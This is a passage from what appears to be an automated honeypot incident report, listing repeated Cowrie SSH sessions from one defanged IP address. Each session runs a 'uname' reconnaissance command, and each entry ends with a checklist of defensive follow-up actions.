| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:53` | `cowrie.session.connect` |
| `2026-08-24 01:13:53` | `cowrie.client.version` |
| `2026-08-24 01:13:53` | `cowrie.client.kex` |
| `2026-08-24 01:13:54` | `cowrie.login.success` |
| `2026-08-24 01:13:54` | `cowrie.session.params` |
| `2026-08-24 01:13:54` | `cowrie.command.input` |
| `2026-08-24 01:13:55` | `cowrie.log.closed` |
| `2026-08-24 01:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5202e1159e11

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:13 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:13:58` | `cowrie.session.connect` |
| `2026-08-24 01:13:58` | `cowrie.client.version` |
| `2026-08-24 01:13:59` | `cowrie.client.kex` |
| `2026-08-24 01:13:59` | `cowrie.login.success` |
| `2026-08-24 01:14:00` | `cowrie.session.params` |
| `2026-08-24 01:14:00` | `cowrie.command.input` |
| `2026-08-24 01:14:00` | `cowrie.log.closed` |
| `2026-08-24 01:14:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34df2cbbc4e3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:04` | `cowrie.session.connect` |
| `2026-08-24 01:14:04` | `cowrie.client.version` |
| `2026-08-24 01:14:04` | `cowrie.client.kex` |
| `2026-08-24 01:14:04` | `cowrie.login.success` |
| `2026-08-24 01:14:05` | `cowrie.session.params` |
| `2026-08-24 01:14:05` | `cowrie.command.input` |
| `2026-08-24 01:14:05` | `cowrie.log.closed` |
| `2026-08-24 01:14:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d76d0c1245cd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:09` | `cowrie.session.connect` |
| `2026-08-24 01:14:09` | `cowrie.client.version` |
| `2026-08-24 01:14:09` | `cowrie.client.kex` |
| `2026-08-24 01:14:10` | `cowrie.login.success` |
| `2026-08-24 01:14:11` | `cowrie.session.params` |
| `2026-08-24 01:14:11` | `cowrie.command.input` |
| `2026-08-24 01:14:11` | `cowrie.log.closed` |
| `2026-08-24 01:14:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba5a40cfdf73

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:15` | `cowrie.session.connect` |
| `2026-08-24 01:14:15` | `cowrie.client.version` |
| `2026-08-24 01:14:15` | `cowrie.client.kex` |
| `2026-08-24 01:14:15` | `cowrie.login.success` |
| `2026-08-24 01:14:16` | `cowrie.session.params` |
| `2026-08-24 01:14:16` | `cowrie.command.input` |
| `2026-08-24 01:14:16` | `cowrie.log.closed` |
| `2026-08-24 01:14:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aa287f08b0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:20` | `cowrie.session.connect` |
| `2026-08-24 01:14:20` | `cowrie.client.version` |
| `2026-08-24 01:14:20` | `cowrie.client.kex` |
| `2026-08-24 01:14:20` | `cowrie.login.success` |
| `2026-08-24 01:14:21` | `cowrie.session.params` |
| `2026-08-24 01:14:21` | `cowrie.command.input` |
| `2026-08-24 01:14:21` | `cowrie.log.closed` |
| `2026-08-24 01:14:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc01c5157b08

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:25` | `cowrie.session.connect` |
| `2026-08-24 01:14:25` | `cowrie.client.version` |
| `2026-08-24 01:14:25` | `cowrie.client.kex` |
| `2026-08-24 01:14:25` | `cowrie.login.success` |
| `2026-08-24 01:14:26` | `cowrie.session.params` |
| `2026-08-24 01:14:26` | `cowrie.command.input` |
| `2026-08-24 01:14:26` | `cowrie.log.closed` |
| `2026-08-24 01:14:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93ddb8d757e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:30` | `cowrie.session.connect` |
| `2026-08-24 01:14:30` | `cowrie.client.version` |
| `2026-08-24 01:14:30` | `cowrie.client.kex` |
| `2026-08-24 01:14:31` | `cowrie.login.success` |
| `2026-08-24 01:14:32` | `cowrie.session.params` |
| `2026-08-24 01:14:32` | `cowrie.command.input` |
| `2026-08-24 01:14:32` | `cowrie.log.closed` |
| `2026-08-24 01:14:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e19044338ae7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:35` | `cowrie.session.connect` |
| `2026-08-24 01:14:35` | `cowrie.client.version` |
| `2026-08-24 01:14:36` | `cowrie.client.kex` |
| `2026-08-24 01:14:36` | `cowrie.login.success` |
| `2026-08-24 01:14:37` | `cowrie.session.params` |
| `2026-08-24 01:14:37` | `cowrie.command.input` |
| `2026-08-24 01:14:37` | `cowrie.log.closed` |
| `2026-08-24 01:14:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2425480485d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:40` | `cowrie.session.connect` |
| `2026-08-24 01:14:40` | `cowrie.client.version` |
| `2026-08-24 01:14:41` | `cowrie.client.kex` |
| `2026-08-24 01:14:41` | `cowrie.login.success` |
| `2026-08-24 01:14:42` | `cowrie.session.params` |
| `2026-08-24 01:14:42` | `cowrie.command.input` |
| `2026-08-24 01:14:42` | `cowrie.log.closed` |
| `2026-08-24 01:14:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8907c64c20f1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:46` | `cowrie.session.connect` |
| `2026-08-24 01:14:46` | `cowrie.client.version` |
| `2026-08-24 01:14:46` | `cowrie.client.kex` |
| `2026-08-24 01:14:46` | `cowrie.login.success` |
| `2026-08-24 01:14:47` | `cowrie.session.params` |
| `2026-08-24 01:14:47` | `cowrie.command.input` |
| `2026-08-24 01:14:47` | `cowrie.log.closed` |
| `2026-08-24 01:14:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a643f3aad7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:51` | `cowrie.session.connect` |
| `2026-08-24 01:14:51` | `cowrie.client.version` |
| `2026-08-24 01:14:51` | `cowrie.client.kex` |
| `2026-08-24 01:14:51` | `cowrie.login.success` |
| `2026-08-24 01:14:52` | `cowrie.session.params` |
| `2026-08-24 01:14:52` | `cowrie.command.input` |
| `2026-08-24 01:14:52` | `cowrie.log.closed` |
| `2026-08-24 01:14:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c6f3615d5cf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:14 |
| **Last Seen** | 2026-08-24 01:14 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:14:56` | `cowrie.session.connect` |
| `2026-08-24 01:14:56` | `cowrie.client.version` |
| `2026-08-24 01:14:56` | `cowrie.client.kex` |
| `2026-08-24 01:14:57` | `cowrie.login.success` |
| `2026-08-24 01:14:58` | `cowrie.session.params` |
| `2026-08-24 01:14:58` | `cowrie.command.input` |
| `2026-08-24 01:14:58` | `cowrie.log.closed` |
| `2026-08-24 01:14:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a66c7aa1e77

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:01` | `cowrie.session.connect` |
| `2026-08-24 01:15:01` | `cowrie.client.version` |
| `2026-08-24 01:15:01` | `cowrie.client.kex` |
| `2026-08-24 01:15:02` | `cowrie.login.success` |
| `2026-08-24 01:15:03` | `cowrie.session.params` |
| `2026-08-24 01:15:03` | `cowrie.command.input` |
| `2026-08-24 01:15:03` | `cowrie.log.closed` |
| `2026-08-24 01:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-666caba5f5a0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:07` | `cowrie.session.connect` |
| `2026-08-24 01:15:07` | `cowrie.client.version` |
| `2026-08-24 01:15:07` | `cowrie.client.kex` |
| `2026-08-24 01:15:07` | `cowrie.login.success` |
| `2026-08-24 01:15:08` | `cowrie.session.params` |
| `2026-08-24 01:15:08` | `cowrie.command.input` |
| `2026-08-24 01:15:08` | `cowrie.log.closed` |
| `2026-08-24 01:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aea74173bab

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:12` | `cowrie.session.connect` |
| `2026-08-24 01:15:12` | `cowrie.client.version` |
| `2026-08-24 01:15:12` | `cowrie.client.kex` |
| `2026-08-24 01:15:12` | `cowrie.login.success` |
| `2026-08-24 01:15:13` | `cowrie.session.params` |
| `2026-08-24 01:15:13` | `cowrie.command.input` |
| `2026-08-24 01:15:13` | `cowrie.log.closed` |
| `2026-08-24 01:15:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f516172d843a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:17` | `cowrie.session.connect` |
| `2026-08-24 01:15:17` | `cowrie.client.version` |
| `2026-08-24 01:15:17` | `cowrie.client.kex` |
| `2026-08-24 01:15:17` | `cowrie.login.success` |
| `2026-08-24 01:15:18` | `cowrie.session.params` |
| `2026-08-24 01:15:18` | `cowrie.command.input` |
| `2026-08-24 01:15:18` | `cowrie.log.closed` |
| `2026-08-24 01:15:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5c026dfe08

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:22` | `cowrie.session.connect` |
| `2026-08-24 01:15:22` | `cowrie.client.version` |
| `2026-08-24 01:15:22` | `cowrie.client.kex` |
| `2026-08-24 01:15:22` | `cowrie.login.success` |
| `2026-08-24 01:15:23` | `cowrie.session.params` |
| `2026-08-24 01:15:23` | `cowrie.command.input` |
| `2026-08-24 01:15:23` | `cowrie.log.closed` |
| `2026-08-24 01:15:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2499c8746fa5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:27` | `cowrie.session.connect` |
| `2026-08-24 01:15:27` | `cowrie.client.version` |
| `2026-08-24 01:15:27` | `cowrie.client.kex` |
| `2026-08-24 01:15:28` | `cowrie.login.success` |
| `2026-08-24 01:15:29` | `cowrie.session.params` |
| `2026-08-24 01:15:29` | `cowrie.command.input` |
| `2026-08-24 01:15:29` | `cowrie.log.closed` |
| `2026-08-24 01:15:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc0bafe8616a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:33` | `cowrie.session.connect` |
| `2026-08-24 01:15:33` | `cowrie.client.version` |
| `2026-08-24 01:15:33` | `cowrie.client.kex` |
| `2026-08-24 01:15:33` | `cowrie.login.success` |
| `2026-08-24 01:15:34` | `cowrie.session.params` |
| `2026-08-24 01:15:34` | `cowrie.command.input` |
| `2026-08-24 01:15:34` | `cowrie.log.closed` |
| `2026-08-24 01:15:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6421e0a2a0c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:38` | `cowrie.session.connect` |
| `2026-08-24 01:15:38` | `cowrie.client.version` |
| `2026-08-24 01:15:38` | `cowrie.client.kex` |
| `2026-08-24 01:15:38` | `cowrie.login.success` |
| `2026-08-24 01:15:39` | `cowrie.session.params` |
| `2026-08-24 01:15:39` | `cowrie.command.input` |
| `2026-08-24 01:15:39` | `cowrie.log.closed` |
| `2026-08-24 01:15:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b013b3199520

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:43` | `cowrie.session.connect` |
| `2026-08-24 01:15:43` | `cowrie.client.version` |
| `2026-08-24 01:15:43` | `cowrie.client.kex` |
| `2026-08-24 01:15:44` | `cowrie.login.success` |
| `2026-08-24 01:15:44` | `cowrie.session.params` |
| `2026-08-24 01:15:44` | `cowrie.command.input` |
| `2026-08-24 01:15:45` | `cowrie.log.closed` |
| `2026-08-24 01:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8922b047a91a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:49` | `cowrie.session.connect` |
| `2026-08-24 01:15:49` | `cowrie.client.version` |
| `2026-08-24 01:15:49` | `cowrie.client.kex` |
| `2026-08-24 01:15:49` | `cowrie.login.success` |
| `2026-08-24 01:15:50` | `cowrie.session.params` |
| `2026-08-24 01:15:50` | `cowrie.command.input` |
| `2026-08-24 01:15:50` | `cowrie.log.closed` |
| `2026-08-24 01:15:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd2b77e7d960

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:54` | `cowrie.session.connect` |
| `2026-08-24 01:15:54` | `cowrie.client.version` |
| `2026-08-24 01:15:54` | `cowrie.client.kex` |
| `2026-08-24 01:15:54` | `cowrie.login.success` |
| `2026-08-24 01:15:55` | `cowrie.session.params` |
| `2026-08-24 01:15:55` | `cowrie.command.input` |
| `2026-08-24 01:15:55` | `cowrie.log.closed` |
| `2026-08-24 01:15:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28a1c2521265

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:15 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:15:59` | `cowrie.session.connect` |
| `2026-08-24 01:15:59` | `cowrie.client.version` |
| `2026-08-24 01:15:59` | `cowrie.client.kex` |
| `2026-08-24 01:16:00` | `cowrie.login.success` |
| `2026-08-24 01:16:00` | `cowrie.session.params` |
| `2026-08-24 01:16:00` | `cowrie.command.input` |
| `2026-08-24 01:16:00` | `cowrie.log.closed` |
| `2026-08-24 01:16:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]153` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aab03df086af

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]153` |
| **First Seen** | 2026-08-24 01:16 |
| **Last Seen** | 2026-08-24 01:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 01:16:04` | `cowrie.session.connect` |
| `2026-08-24 01:16:04` | `cowrie.client.version` |
| `2026-08-24 01:16:04` | `cowrie.client.kex` |
| `2026-08-24 01:16:05` | `cowrie.login.success` |
| `2026-08-24 01:16:06` | `cowrie.session.params` |
| `2026-08-24 01:16:06` | `cowrie.command.input` |
| `2026-08-24 01:16:06` | `cowrie.log.closed` |
| `2026-08-24 01:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
